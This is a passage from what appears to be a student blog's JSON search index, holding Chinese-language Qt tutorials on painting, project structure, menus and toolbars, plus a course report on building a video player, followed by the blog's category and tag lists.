&#x3D;&#x3D; &#39;d&#39;) a-&gt;data &#x3D; 1 &#x2F; a-&gt;data; if (b-&gt;sign &#x3D;&#x3D; &#39;f&#39;) a-&gt;data &#x3D; -a-&gt;data; if(b!&#x3D;tail) a-&gt;next &#x3D; b-&gt;next; else &#123; a-&gt;next &#x3D; nullptr; tail &#x3D; a; &#125;&#125; 计算样例","categories":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Qt/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Qt/"},{"name":"大一","slug":"大一","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%80/"},{"name":"作业","slug":"作业","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"Qt绘图","slug":"Qt/Qt绘图","date":"2019-08-31T04:00:00.000Z","updated":"2020-04-30T07:39:49.494Z","comments":true,"path":"2019/08/31/Qt/Qt绘图/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2019/08/31/Qt/Qt%E7%BB%98%E5%9B%BE/","excerpt":"","text":"绘图设备： QPixmap：针对屏幕进行优化，和平台相关，不能对图片进行修改 QImage：和平台无关，可以对图片进行修改，在线程中绘图 QPicture：将绘图状态保存为一个二进制文件 用法相同，但作用有区别 #ifndef MAINWINDOW_H#define MAINWINDOW_H#include &lt;QMainWindow&gt;namespace Ui &#123;class MainWindow;&#125;class MainWindow : public QMainWindow&#123; Q_OBJECTpublic: explicit MainWindow(QWidget *parent &#x3D; nullptr); ~MainWindow();protected: &#x2F;&#x2F;重写绘图事件，虚函数 &#x2F;&#x2F;如果在窗口绘图，不许放在绘图事件里实现 &#x2F;&#x2F;绘图事件内部自动调用，窗口需要重绘的时候（状态改变） void paintEvent(QPaintEvent*);private slots: void on_pushButton_clicked();private: Ui::MainWindow *ui; int x; int y;&#125;;#endif &#x2F;&#x2F; MAINWINDOW_H #include &quot;mainwindow.h&quot;#include &quot;ui_mainwindow.h&quot;#include &lt;QPainter&gt;#include &lt;QDebug&gt;#include &lt;QBrush&gt;MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWindow)&#123; ui-&gt;setupUi(this); x&#x3D;0;&#125;MainWindow::~MainWindow()&#123; delete ui;&#125;void MainWindow::paintEvent(QPaintEvent* )&#123; &#x2F;&#x2F;QPainter p(this);与下面两个等价 QPainter p;&#x2F;&#x2F;创建画家对象 p.begin(this);&#x2F;&#x2F;指定当前窗口为绘图设备 &#x2F;&#x2F;绘图操作 &#x2F;&#x2F;p.drawxxx();各种绘图样式 &#x2F;&#x2F;画背景图 &#x2F;&#x2F;p.drawPixmap(0,0,width(),height(),QPixmap(&quot;E:&#x2F;study&#x2F;qt&#x2F;code&#x2F;bb6a99488e1385c992bf0ad07392ccaa.jpeg&quot;)); p.drawPixmap(rect(),QPixmap(&quot;E:&#x2F;study&#x2F;qt&#x2F;code&#x2F;bb6a99488e1385c992bf0ad07392ccaa.jpeg&quot;)); &#x2F;&#x2F;自定义画笔 QPen pen; pen.setWidth(5);&#x2F;&#x2F;设置线宽 &#x2F;&#x2F;pen.setColor(Qt::red); pen.setColor(QColor(14,9,234));&#x2F;&#x2F;RGB设置颜色 pen.setStyle(Qt::SolidLine);&#x2F;&#x2F;设置风格 &#x2F;&#x2F;把画笔交给画家 p.setPen(pen); &#x2F;&#x2F;画直线 p.drawLine(50,50,150,50); p.drawLine(50,50,50,150); &#x2F;&#x2F;创建画刷对象 QBrush brush; brush.setColor(Qt::red); brush.setStyle(Qt::Dense1Pattern);&#x2F;&#x2F;设置样式 p.setBrush(brush); &#x2F;&#x2F;画矩形 p.drawRect(150,150,100,50); &#x2F;&#x2F;画圆形 p.drawEllipse(QPoint(150,150),50,25); &#x2F;&#x2F;画笑脸 p.drawPixmap(x,500,300,200,QPixmap(&quot;C:&#x2F;Users&#x2F;lxm&#x2F;Pictures&#x2F;Saved Pictures&#x2F;明信片16.jpg&quot;)); p.end();&#125;void MainWindow::on_pushButton_clicked()&#123; x+&#x3D;20; if(x&gt;width()) &#123; x&#x3D;0; &#125; &#x2F;&#x2F;刷新窗口，让整个窗口重绘 update();&#x2F;&#x2F;简介调用paintEvent（）&#125; 保存图片#include &quot;mainwindow.h&quot;#include &quot;ui_mainwindow.h&quot;#include &lt;QPainter&gt;MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWindow)&#123; ui-&gt;setupUi(this); &#x2F;&#x2F;绘图设备，400*300 QPixmap pixmap(400,300); QPainter p(&amp;pixmap); &#x2F;&#x2F;填充白色 p.fillRect(0,0,400,300,QBrush(Qt::white)); p.drawPixmap(0,0,80,80,QPixmap(&quot;C:&#x2F;Users&#x2F;lxm&#x2F;Pictures&#x2F;3e40d65390723ce873e88385b4d57bff.jpeg&quot;)); &#x2F;&#x2F;保存图片 pixmap.save(&quot;..&#x2F;pixmap.png&quot;);&#125;MainWindow::~MainWindow()&#123; delete ui;&#125;","categories":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Qt/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Qt/"},{"name":"大一","slug":"大一","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%80/"}]},{"title":"Qt的框架","slug":"Qt/Qt的框架","date":"2019-08-31T04:00:00.000Z","updated":"2020-04-30T07:39:41.687Z","comments":true,"path":"2019/08/31/Qt/Qt的框架/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2019/08/31/Qt/Qt%E7%9A%84%E6%A1%86%E6%9E%B6/","excerpt":"","text":"main.cpp#include &quot;widget.h&quot;#include &lt;QApplication&gt;&#x2F;&#x2F;QApplication应用程序类&#x2F;&#x2F;Qt头文件没有.h&#x2F;&#x2F;头文件和类名一样int main(int argc, char *argv[])&#123; &#x2F;&#x2F;有且只有一个应用程序类对象 QApplication a(argc, argv); &#x2F;&#x2F;MyWidget继承Qwidget，QWidget是一个窗口类对象 &#x2F;&#x2F;w是窗口 Widget w; &#x2F;&#x2F;窗口创建默认是隐藏的，需要认为显示 w.show(); &#x2F;&#x2F;让程序一直执行，等待人为操作（等待事件的发生） return a.exec();&#x2F;&#x2F;a是应用程序对象&#125; ##.pro #-------------------------------------------------## Project created by QtCreator 2019-06-28T19:37:51##-------------------------------------------------#项目文件用“#”注释#模块QT +&#x3D; core gui#高于4版本添加QT+&#x3D;widgets，为了兼容4greaterThan(QT_MAJOR_VERSION, 4): QT +&#x3D; widgets#应用程序的名字TARGET &#x3D; untitled5#指定makefile的类型，app&#x2F;lib（库）TEMPLATE &#x3D; app# The following define makes your compiler emit warnings if you use# any feature of Qt which has been marked as deprecated (the exact warnings# depend on your compiler). Please consult the documentation of the# deprecated API in order to know how to port your code away from it.DEFINES +&#x3D; QT_DEPRECATED_WARNINGS# You can also make your code fail to compile if you use deprecated APIs.# In order to do so, uncomment the following line.# You can also select to disable deprecated APIs only up to a certain version of Qt.#DEFINES +&#x3D; QT_DISABLE_DEPRECATED_BEFORE&#x3D;0x060000 # disables all the APIs deprecated before Qt 6.0.0CONFIG +&#x3D; c++11#源文件.cppSOURCES +&#x3D; \\ main.cpp \\ widget.cpp#头文件.hHEADERS +&#x3D; \\ widget.h# Default rules for deployment.qnx: target.path &#x3D; &#x2F;tmp&#x2F;$$&#123;TARGET&#125;&#x2F;binelse: unix:!android: target.path &#x3D; &#x2F;opt&#x2F;$$&#123;TARGET&#125;&#x2F;bin!isEmpty(target.path): INSTALLS +&#x3D; target ##widget.h #ifndef WIDGET_H#define WIDGET_H#include &lt;QWidget&gt;class Widget : public QWidget&#123; Q_OBJECT&#x2F;&#x2F;信号与槽需要public: Widget(QWidget *parent &#x3D; 0); ~Widget();&#125;;#endif &#x2F;&#x2F; WIDGET_H ##widget.cpp #include &quot;widget.h&quot;Widget::Widget(QWidget *parent) : QWidget(parent)&#123;&#125;Widget::~Widget()&#123;&#125;","categories":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Qt/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Qt/"},{"name":"大一","slug":"大一","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%80/"}]},{"title":"Qt菜单栏和工具栏","slug":"Qt/Qt菜单栏和工具栏","date":"2019-08-31T04:00:00.000Z","updated":"2020-04-30T07:47:49.430Z","comments":true,"path":"2019/08/31/Qt/Qt菜单栏和工具栏/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2019/08/31/Qt/Qt%E8%8F%9C%E5%8D%95%E6%A0%8F%E5%92%8C%E5%B7%A5%E5%85%B7%E6%A0%8F/","excerpt":"","text":"信号是给槽函数传参的，信号函数只需声明，不需定义#include \"mainwindow.h\"#include &lt;QmenuBar&gt;#include &lt;Qmenu&gt;#include &lt;QAction&gt;#include &lt;QtDebug&gt;#include &lt;QToolBar&gt;#include &lt;QPushButton&gt;#include &lt;QStatusBar&gt;#include &lt;QLabel&gt;#include &lt;qlabel.h&gt;#include &lt;QTextEdit&gt;#include &lt;QDockWidget&gt;MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent)&#123; //菜单栏 QMenuBar *mBar=new QMenuBar(this); //添加菜单 QMenu *pFile = mBar-&gt;addMenu(\"文件\"); //添加菜单项，添加动作 QAction *pNew=pFile-&gt;addAction(\"新建\"); connect(pNew,&amp;QAction::triggered, [=]() &#123; qDebug(\"push\"); &#125;); pFile-&gt;addSeparator();//添加分割线 QAction *popen=pFile-&gt;addAction(\"打开\"); //工具栏，菜单上的快捷方式 QToolBar *toolbar=addToolBar(\"toolbar\"); //工具栏添加快捷键 toolbar-&gt;addAction(pNew); //添加小控件 QPushButton *b=new QPushButton(this); b-&gt;setText(\"123\"); toolbar-&gt;addWidget(b); connect(b,&amp;QPushButton::clicked, [=]() &#123; b-&gt;setText(\"345\"); &#125;); //状态栏 QStatusBar *sbar=new QStatusBar(this); QLabel *label=new QLabel(this); label-&gt;setText(\"Normal text file\"); sbar-&gt;addWidget(label); //addWidget 从左往右添加 sbar-&gt;addWidget(new QLabel(\"2\",this)); //从右往左添加 sbar-&gt;addPermanentWidget(new QLabel(\"3\",this)); //核心控件 QTextEdit *textEdit = new QTextEdit(this); setCentralWidget(textEdit); //浮动窗口 QDockWidget *dock=new QDockWidget(this); addDockWidget(Qt::RightDockWidgetArea,dock); //给浮动窗口添加控件 QTextEdit *textEdit1 = new QTextEdit(); dock-&gt;setWidget(textEdit1);&#125;MainWindow::~MainWindow()&#123;&#125;","categories":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Qt/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Qt/"},{"name":"大一","slug":"大一","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%80/"}]},{"title":"Qt大作业：影音播放器","slug":"Qt/Qt大作业报告","date":"2019-08-31T04:00:00.000Z","updated":"2020-04-30T07:45:31.631Z","comments":true,"path":"2019/08/31/Qt/Qt大作业报告/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2019/08/31/Qt/Qt%E5%A4%A7%E4%BD%9C%E4%B8%9A%E6%8A%A5%E5%91%8A/","excerpt":"","text":"软件类别：本地视频文件播放器 软件设计、实现的思路和方法：类名：player，继承自 QMainWindow自定义类：video，继承自 QVideoWidget *注： 播放部分格式文件需要安装解码器，安装包(LAVfilters)已打包一起发送 影音文件已打包发送，可直接用于软件测试 主要功能和槽函数：private slots: void openFile();//打开文件 void fullScr();//全屏 void play_and_pause();//播放和暂停 void minimize();//小窗置顶和取消 void positionChanged(qint64 position);//进度条位置设置，随视频文件播放变化 void setPosition(qint64 position);//获取播放位置 void getDuration();//获取视频文件长度 void on_progress_sliderMoved(int position);//进度条滑动改变视频进度 void next_song();//下一项 1、界面设计 ui-designer 布局代码 //将widget设置为中心layoutwidget=new QWidget;this-&gt;setCentralWidget(widget);//水平布局，控制按钮QBoxLayout *ctlLayout = new QHBoxLayout;ctlLayout-&gt;addWidget(ui-&gt;open);ctlLayout-&gt;addWidget(ui-&gt;playBtn);ctlLayout-&gt;addWidget(ui-&gt;next);ctlLayout-&gt;addWidget(ui-&gt;progress);ctlLayout-&gt;addWidget(ui-&gt;fullscreenBtn);ctlLayout-&gt;addWidget(ui-&gt;min);//调整水平布局部件比例ctlLayout-&gt;setStretchFactor(ui-&gt;playBtn,1);ctlLayout-&gt;setStretchFactor(ui-&gt;progress,10);ctlLayout-&gt;setStretchFactor(ui-&gt;fullscreenBtn,1);ctlLayout-&gt;setStretchFactor(ui-&gt;min,1);//垂直布局：视频播放器、水平控制布局QBoxLayout *mainLayout = new QVBoxLayout;mainLayout-&gt;addWidget(videowidget);mainLayout-&gt;addLayout(ctlLayout);//设置布局widget-&gt;setLayout(mainLayout);this-&gt;setWindowTitle(\"lxm的播放器\");//设置按钮透明ui-&gt;playBtn-&gt;setFlat(true);ui-&gt;open-&gt;setFlat(true);ui-&gt;fullscreenBtn-&gt;setFlat(true);ui-&gt;min-&gt;setFlat(true);ui-&gt;next-&gt;setFlat(true);//设置图标//所有图片均采用相对路径，并保存在资源文件下QIcon icon1;icon1.addFile(\":/image/video_player_783px_1234870_easyicon.net.png\");setWindowIcon(icon1);QIcon icon;icon.addFile(\":/image/next_596px_1229355_easyicon.net.png\");ui-&gt;playBtn-&gt;setIcon(icon);QIcon icon3;icon3.addFile(\":/image/File_Box_808px_1145730_easyicon.net.png\");ui-&gt;open-&gt;setIcon(icon3);icon.addFile(\":/image/fullscreen_128px_1181910_easyicon.net.png\");ui-&gt;fullscreenBtn-&gt;setIcon(icon);QIcon icon2;icon2.addFile(\":/image/button_arrow_up_200px_1189268_easyicon.net.png\");ui-&gt;min-&gt;setIcon(icon2);QIcon icon7;icon7.addFile(\":/image/next_596px_1229354_easyicon.net.png\");ui-&gt;next-&gt;setIcon(icon7);//设置按钮文字提示ui-&gt;open-&gt;setToolTip(tr(\"打开文件\"));ui-&gt;playBtn-&gt;setToolTip(tr(\"播放\"));ui-&gt;fullscreenBtn-&gt;setToolTip(tr(\"全屏\"));ui-&gt;min-&gt;setToolTip(tr(\"小窗置顶\"));ui-&gt;next-&gt;setToolTip(tr(\"下一项\")); 软件界面： 2、文件批量载入 信号和槽：QObject::connect(ui-&gt;open,SIGNAL (clicked()),this,SLOT(openFile())); 实现思路：见代码注释 功能截图： 实现方法： void player::openFile()&#123; //打开工程文件所在文件夹，文件夹中放置了影音文件 //list中存入文件名，使用QStringList和getOpenFileNames实现批量导入 QStringList list=QFileDialog::getOpenFileNames(this); for(int k=0;k&lt;list.size();k++) &#123; //path保存歌曲路径 QString path=QDir::toNativeSeparators(list.at(k)); //将该路径倒入到playlist中 playlist-&gt;addMedia(QUrl::fromLocalFile(path)); //同路径中提取出文件名 QString name=path.split(\"\\\\\").last(); &#125; //导入后自动开始播放 if(mediaplayer-&gt;state()!=1)//判断当前是否出于播放状态 play_and_pause();//播放&#125; 3、视频播放和暂停 信号和槽：QObject::connect(ui-&gt;playBtn,SIGNAL(clicked()),this,SLOT(play_and_pause())); 实现思路：当视频为停止或暂停状态时，按钮play图标为“播放”，提示为“播放”,点击事件可以是视频变为播放状态;当视频为播放状态时，改变为暂停图标，按钮提示为“暂停”。 快捷键：空格 功能截图：播放状态暂停状态 实现方法：void player::play_and_pause()&#123; switch (mediaplayer-&gt;state()) &#123; case 1://playing &#123; QIcon icon; icon.addFile(\":/image/wedding_video_783px_1219421_easyicon.net.png\");//改变图标 ui-&gt;playBtn-&gt;setIcon(icon); mediaplayer-&gt;pause();//暂停播放 ui-&gt;playBtn-&gt;setToolTip(tr(\"播放\")); break; &#125; default://stop&amp;paused &#123; QIcon icon; icon.addFile(\":/image/pause_button_195px_1197803_easyicon.net.png\"); ui-&gt;playBtn-&gt;setIcon(icon); mediaplayer-&gt;play();//播放 ui-&gt;playBtn-&gt;setToolTip(tr(\"暂停\")); &#125; &#125;&#125; 4、进度条位置的调节 信号和槽：QObject::connect(mediaplayer,SIGNAL(positionChanged(qint64)),this,SLOT(positionChanged(qint64)));QObject::connect(mediaplayer,SIGNAL(durationChanged(qint64)),this,SLOT(getDuration())); 实现思路：获取视频总时长和滑块可调节长度计算出换算比例，使滑块位置和视频播放位置相对应，具体见下方代码注释 实现方法：void player::positionChanged(qint64 position)&#123; //这里的position指的是视频的播放对应的时间 //按照比例设置进度条位置 ui-&gt;progress-&gt;setValue(position/time2);&#125;void player::setPosition(qint64 position)&#123; //获取mediaplayer进度调整位置 mediaplayer-&gt;setPosition(position);&#125;void player::on_progress_sliderMoved(int position)&#123; //position为滑块位置，position*time2为滑块位置应对应的视频时刻 setPosition(position*time2);&#125;void player::getDuration()&#123; //获取视频文件时间长度 time=mediaplayer-&gt;duration(); //horizontalbar的长度为100，time2为比例系数 time2=(int)time/100;&#125; 5、小窗置顶功能 信号和槽：QObject::connect(ui-&gt;min,SIGNAL(clicked()),this,SLOT(minimize())); 功能描述：将该程序置顶于所有窗口,点击置顶按钮会提示“双击快捷操作”，使用双击方式置顶\\取消置顶则不会提示，使使用更加流畅 功能截图： 未置顶状态 置顶状态（可以在看视频的同时操作其它软件） 实现方法：//置顶功能void player::up()&#123; if (m_flags == NULL) &#123; //将播放器设置为置顶 m_flags = windowFlags(); setWindowFlags(m_flags | Qt::WindowStaysOnTopHint); show(); //变换图标和按钮提示 QIcon icon2; icon2.addFile(\":/image/down.png\"); ui-&gt;min-&gt;setIcon(icon2); ui-&gt;min-&gt;setToolTip(tr(\"取消窗口置顶\")); &#125; else &#123; //取消播放器置顶 m_flags = nullptr; setWindowFlags(m_flags); show(); //变换图标和按钮提示 QIcon icon2; icon2.addFile(\":/image/button_arrow_up_200px_1189268_easyicon.net.png\"); ui-&gt;min-&gt;setIcon(icon2); ui-&gt;min-&gt;setToolTip(tr(\"小窗置顶\")); &#125;&#125; //槽函数void player::minimize()&#123; QMessageBox::about(this, tr(\"Tips\"), tr(\"双击进入/退出小窗\")); up();&#125; //鼠标双击快捷操作void player::mouseDoubleClickEvent(QMouseEvent*)&#123; up();&#125; 6、全屏功能 信号和槽：QObject::connect(ui-&gt;fullscreenBtn,SIGNAL(clicked()),this,SLOT(fullScr())); 实现思路：首先对mediaplayer的全屏状态进行判断，若为非全屏状态，使用enter键或点击全屏按钮均可进入全屏，若为全屏状态，点击enter键退出全屏。点击全屏按钮会提示“快捷键enter”,而直接点击enter键进入全屏则不会，使使用更加流畅 功能截图： 实现方法：player类：void player::fullScr()//全屏功能&#123; if(mediaplayer-&gt;state()==1)//若正在播放，则可进入全屏状态 &#123; //全屏前需要取消小窗置顶 setWindowFlags(nullptr); show(); //全屏 videowidget-&gt;setFullScreen(true); QMessageBox::about(this, tr(\"Tips\"), tr(\"enter键进入/退出全屏\")); &#125; else &#123; &#123; //当前不在播放视频，无法进入全屏模式 videowidget-&gt;setFullScreen(false); &#125; &#125;&#125; 在video类也写入槽函数：解决全屏后player类父窗口无法接收到信号的问题void video::keyPressEvent(QKeyEvent *keyset)//全屏和全屏退出&#123; if(keyset-&gt;key()==16777220)//回车键 &#123; if(this-&gt;isFullScreen())//如果当前出于全屏状态 &#123; //退出全屏 this-&gt;setWindowFlags (Qt::SubWindow); this-&gt;showNormal(); &#125; else &#123; //进入全屏 this-&gt;setFullScreen(true); &#125; &#125;&#125; 7、播放下一项 信号和槽QObject::connect(ui-&gt;next,SIGNAL(clicked()),this,SLOT(next_song())); 实现思路将进度条拉至最后 截图： 实现方法void player::next_song()&#123; setPosition(100*time2);&#125; 注意事项 //需将mediaplayer设置为循环播放，否则会在播放最后一项时再点击next会导致程序退出playlist-&gt;setPlaybackMode(QMediaPlaylist::Loop); 8、可作为音频播放器使用 功能描述：支持音频播放，支持播放列表中同时存在视频和音频 功能截图： 遇到的问题和解决方法（*注：部分细节问题以列入代码注释中） ui-&gt;designer中的控件运行之后界面不显示 被设置为中心layout的widget所覆盖，需添加QVBoxLayout，分离widget和按钮控件 进度条无法正常使用 需正确设置进度条位置和视频播放位置的换算比例（time2） durationChanged()函数执行后，文件时间长度值time依然为0 重写时间获取槽函数QObject::connect(mediaplayer,SIGNAL(positionChanged(qint64)),this,SLOT(positionChanged(qint64)));QObject::connect(mediaplayer,SIGNAL(durationChanged(qint64)),this,SLOT(getDuration()));void player::getDuration()&#123; //获取视频文件时间长度 time=mediaplayer-&gt;duration(); //horizontalbar的长度为100，time2为比例系数 time2=(int)time/100;&#125; 全屏后无法退出 全屏后信号被子窗口（video）接收，父窗口（player）无法接收到信号，而全屏相关函数的信号接收对象是父窗口，故无法接收到信号。 所以，只需在video类中也写入全屏函数即可，详见“6、全屏功能” 程序每次运行只能播放一首曲目 改用QStringList记录文件名，优化playlist写入方式，详见上文“2、文件批量载入” “下一项”功能受限，导入的文件只能播放一次 需将mediaplayer设置为循环播放，否则会在播放最后一项时再点击next会导致程序退出playlist-&gt;setPlaybackMode(QMediaPlaylist::Loop);","categories":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Qt/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Qt/"},{"name":"大一","slug":"大一","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%80/"},{"name":"作业","slug":"作业","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E4%BD%9C%E4%B8%9A/"},{"name":"大作业","slug":"大作业","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%BD%9C%E4%B8%9A/"}]}],"categories":[{"name":"实习","slug":"实习","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E5%AE%9E%E4%B9%A0/"},{"name":"pytorch","slug":"pytorch","permalink":"https://gitee.com/michelle19l/michelle19l/categories/pytorch/"},{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"},{"name":"密码学","slug":"密码学","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"爬虫","slug":"爬虫","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E7%88%AC%E8%99%AB/"},{"name":"建模","slug":"建模","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E5%BB%BA%E6%A8%A1/"},{"name":"kali","slug":"kali","permalink":"https://gitee.com/michelle19l/michelle19l/categories/kali/"},{"name":"CTF","slug":"CTF","permalink":"https://gitee.com/michelle19l/michelle19l/categories/CTF/"},{"name":"sqli","slug":"sqli","permalink":"https://gitee.com/michelle19l/michelle19l/categories/sqli/"},{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"},{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/categories/python/"},{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"vmware","slug":"vmware","permalink":"https://gitee.com/michelle19l/michelle19l/categories/vmware/"},{"name":"信安","slug":"信安","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E4%BF%A1%E5%AE%89/"},{"name":"Flask","slug":"Flask","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Flask/"},{"name":"AFL","slug":"AFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/AFL/"},{"name":"问题解决","slug":"问题解决","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"},{"name":"TOEFL","slug":"TOEFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/TOEFL/"},{"name":"计算机组成原理","slug":"计算机组成原理","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"},{"name":"major","slug":"major","permalink":"https://gitee.com/michelle19l/michelle19l/categories/major/"},{"name":"Guide","slug":"Guide","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Guide/"},{"name":"study","slug":"study","permalink":"https://gitee.com/michelle19l/michelle19l/categories/study/"},{"name":"my life :)","slug":"my-life","permalink":"https://gitee.com/michelle19l/michelle19l/categories/my-life/"},{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Qt/"}],"tags":[{"name":"实习","slug":"实习","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%AE%9E%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/tags/python/"},{"name":"机器学习","slug":"机器学习","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"pytorch","slug":"pytorch","permalink":"https://gitee.com/michelle19l/michelle19l/tags/pytorch/"},{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"wpcap","slug":"wpcap","permalink":"https://gitee.com/michelle19l/michelle19l/tags/wpcap/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"网络技术与应用","slug":"网络技术与应用","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"},{"name":"packettracer","slug":"packettracer","permalink":"https://gitee.com/michelle19l/michelle19l/tags/packettracer/"},{"name":"socket","slug":"socket","permalink":"https://gitee.com/michelle19l/michelle19l/tags/socket/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"CTF","slug":"CTF","permalink":"https://gitee.com/michelle19l/michelle19l/tags/CTF/"},{"name":"密码","slug":"密码","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%AF%86%E7%A0%81/"},{"name":"爬虫","slug":"爬虫","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%88%AC%E8%99%AB/"},{"name":"动态网页爬取","slug":"动态网页爬取","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E7%88%AC%E5%8F%96/"},{"name":"建模","slug":"建模","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%BB%BA%E6%A8%A1/"},{"name":"数据采集","slug":"数据采集","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/"},{"name":"元胞自动机","slug":"元胞自动机","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/"},{"name":"kali","slug":"kali","permalink":"https://gitee.com/michelle19l/michelle19l/tags/kali/"},{"name":"sqli","slug":"sqli","permalink":"https://gitee.com/michelle19l/michelle19l/tags/sqli/"},{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"OWASP","slug":"OWASP","permalink":"https://gitee.com/michelle19l/michelle19l/tags/OWASP/"},{"name":"DVWA","slug":"DVWA","permalink":"https://gitee.com/michelle19l/michelle19l/tags/DVWA/"},{"name":"SQLi","slug":"SQLi","permalink":"https://gitee.com/michelle19l/michelle19l/tags/SQLi/"},{"name":"跨站脚本攻击","slug":"跨站脚本攻击","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"},{"name":"php","slug":"php","permalink":"https://gitee.com/michelle19l/michelle19l/tags/php/"},{"name":"web开发","slug":"web开发","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web%E5%BC%80%E5%8F%91/"},{"name":"javascript","slug":"javascript","permalink":"https://gitee.com/michelle19l/michelle19l/tags/javascript/"},{"name":"random.shuffle","slug":"random-shuffle","permalink":"https://gitee.com/michelle19l/michelle19l/tags/random-shuffle/"},{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"sql","slug":"sql","permalink":"https://gitee.com/michelle19l/michelle19l/tags/sql/"},{"name":"kali 